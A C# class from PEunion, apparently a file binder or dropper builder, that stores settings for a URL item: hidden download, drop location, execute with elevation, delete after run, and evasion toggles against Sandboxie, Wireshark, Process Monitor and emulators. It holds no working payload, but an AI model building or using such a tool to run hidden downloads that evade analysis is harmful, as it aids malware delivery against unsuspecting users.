using BytecodeApi;
using System.Linq;

namespace PEunion
{
	public class ProjectUrl : ProjectItem
	{
		public string Url
		{
			get => Get(() => Url);
			set
			{
				Set(() => Url, value);
				Project.IsDirty = true;
				RaisePropertyChanged(() => TreeViewItemText);
			}
		}
		public string Name
		{
			get => Get(() => Name);
			set
			{
				Set(() => Name, value);
				Project.IsDirty = true;
			}
		}
		public bool Hidden
		{
			get => Get(() => Hidden);
			set
			{
				Set(() => Hidden, value);
				Project.IsDirty = true;
			}
		}
		public int DropLocation
		{
			get => Get(() => DropLocation);
			set
			{
				Set(() => DropLocation, value);
				Project.IsDirty = true;
			}
		}
		public bool Execute
		{
			get => Get(() => Execute);
			set
			{
				Set(() => Execute, value);
				RaisePropertyChanged(() => CanExecuteWait);
				ExecuteWait &= value;
				Runas &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteWait
		{
			get => Get(() => ExecuteWait);
			set
			{
				Set(() => ExecuteWait, value);
				RaisePropertyChanged(() => CanExecuteDelete);
				ExecuteDelete &= value;
				Project.IsDirty = true;
			}
		}
		public bool ExecuteDelete
		{
			get => Get(() => ExecuteDelete);
			set
			{
				Set(() => ExecuteDelete, value);
				Project.IsDirty = true;
			}
		}
		public bool Runas
		{
			get => Get(() => Runas);
			set
			{
				Set(() => Runas, value);
				Project.IsDirty = true;
			}
		}
		public string CommandLine
		{
			get => Get(() => CommandLine);
			set
			{
				Set(() => CommandLine, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiSandboxie
		{
			get => Get(() => AntiSandboxie);
			set
			{
				Set(() => AntiSandboxie, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiWireshark
		{
			get => Get(() => AntiWireshark);
			set
			{
				Set(() => AntiWireshark, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiProcessMonitor
		{
			get => Get(() => AntiProcessMonitor);
			set
			{
				Set(() => AntiProcessMonitor, value);
				Project.IsDirty = true;
			}
		}
		public bool AntiEmulator
		{
			get => Get(() => AntiEmulator);
			set
			{
				Set(() => AntiEmulator, value);
				Project.IsDirty = true;
			}
		}

		public string TreeViewItemText => "URL" + (Url.IsNullOrWhiteSpace() ? null : ": " + Wording.TrimText(Url.Trim(), 30));
		public int DropAction
		{
			get => ExecuteDelete ? 3 : ExecuteWait ? 2 : Execute ? 1 : 0;
			set
			{
				Execute = value >= 1;
				ExecuteWait = value >= 2;
				ExecuteDelete = value >= 3;
			}
		}
		public bool CanExecuteWait => Execute;
		public bool CanExecuteDelete => ExecuteWait;

		public ProjectUrl(Project project) : base(project)
		{
			Hidden = true;
			DropLocation = Lookups.DropLocations.Keys.First();
			Execute = true;
		}
	}
}